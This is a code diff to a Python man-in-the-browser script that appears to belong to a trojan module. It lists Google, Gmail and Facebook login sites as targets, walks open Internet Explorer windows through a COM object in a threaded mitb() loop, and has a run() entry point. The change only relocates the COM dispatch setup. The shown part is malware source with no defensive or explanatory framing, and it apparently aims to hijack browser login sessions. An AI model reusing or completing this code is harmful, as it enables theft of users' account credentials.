@@ -30,9 +30,6 @@ target_sites["accounts.google.com"]    = \
 target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
 target_sites["mail.google.com"] = target_sites["accounts.google.com"]
 target_sites["m.facebook.com"] = target_sites["www.facebook.com"]
-clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
-
-windows = win32com.client.Dispatch(clsid)
 
 def wait_for_browser(browser):
     # wait for the browser to finish loadding a page
@@ -42,8 +39,9 @@ def wait_for_browser(browser):
 
 
 def mitb():
-  global windows
-  global clsid
+  clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
+
+  windows = win32com.client.Dispatch(clsid)
   while True:
    for browser in windows:
       url = urlparse.urlparse(browser.LocationUrl)
@@ -98,12 +96,7 @@ def mitb():
       time.sleep(0) 
 
 def run(**args):
-   global clsid
-   global windows
-   clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
-
-   windows = win32com.client.Dispatch(clsid)
-			 
+   	 
    thread_mitb = threading.Thread(target=mitb)
    thread_mitb.start()
    str = "Started running!!"
